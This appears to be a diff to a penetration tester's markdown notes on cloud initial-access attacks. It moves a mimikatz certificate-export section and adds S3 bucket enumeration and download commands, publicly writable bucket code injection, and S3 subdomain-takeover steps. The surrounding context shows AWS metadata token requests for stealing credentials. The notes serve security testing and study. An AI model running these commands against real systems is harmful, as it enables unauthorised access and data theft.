@@ -1,6 +1,6 @@
 # Initial access attacks
 ## Public storage
-#### Find data in public storage
+### Find data in public storage
 - https://github.com/initstring/cloud_enum can scan all three cloud services for multiple services.
 
 #### Public azure blobs
@@ -59,18 +59,6 @@ Invoke-MSOLSpray -UserList validemails.txt -Password <PASSWORD> -Verbose
   - Environment variables
   - Storage Accounts
 
-
-#### Reused access certs as private keys on web servers
-1. Comprimise web server
-2. Extract certificate with mimkatz
-3. Use it to authenticate to Azure
-```
-mimikatz# crypto::capi
-mimikatz# privilege::debug
-mimikatz# crypto::cng
-mimikatz# crypto::certificates /systemstore:local_machine /store:my /export
-```
-
 ### AWS Instance Metadata
 - Metadata endpoint is hosted on a non routable IP adress at 169.254.169.254
 - Can contain access/secret keys to AWS and IAM credentials
@@ -102,6 +90,17 @@ TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metad
 curl http://169.254.169.254/latest/meta-data/profile -H "X-aws-ec2-metadata-token: $TOKEN"
 ```
 
+### Reused access certs as private keys on web servers
+1. Comprimise web server
+2. Extract certificate with mimkatz
+3. Use it to authenticate to Azure
+```
+mimikatz# crypto::capi
+mimikatz# privilege::debug
+mimikatz# crypto::cng
+mimikatz# crypto::certificates /systemstore:local_machine /store:my /export
+```
+
 ## Phishing
 - Still the #1 method of compromise
 - Two primary phishing techniques:
@@ -115,3 +114,31 @@ curl http://169.254.169.254/latest/meta-data/profile -H "X-aws-ec2-metadata-toke
 - Bypasses the “don’t auto-add” setting
 - Include link to phishing page
 - https://www.blackhillsinfosec.com/google-calendar-event-injection-mailsniper/
+
+## S3 bucket pillaging
+#### Brute force bucket names
+- https://github.com/initstring/cloud_enum
+```
+python3 cloud_enum.py -k <KEYWORD>
+```
+
+#### Use the AWS CLI to list the files of the s3 bucket
+```
+sudo aws s3 ls s3://<BUCKET> --profile <PROFILE>
+```
+
+#### Use the AWS CLI to download the files of the s3 bucket
+```
+sudo aws s3 sync s3://<BUCKET> s3-files-dir --profile <PROFILE>
+```
+
+## S3 code injection
+- If a webapp is loading content from an s3 bucket made publicly writeable. Attackers can upload malicious JS to get executed by visitors.
+
+## Domain hijacking
+- Hijack S3 domain by finding references in a webapp to S3 buckets that dont exist anymore.
+- Or subdomains were linked to S3 buckets with CNAME that still exist.
+- When assessing webapps look for 404's to ```*.s3.amazonaws.com```
+1. When brute forcing subdomains for an org look for 404’s with ‘NoSuchBucket’ error
+2. Go create the S3 bucket with the same name and region
+3. 3. Load malicious content to the new S3 bucket that will be executed when visitors hit the site
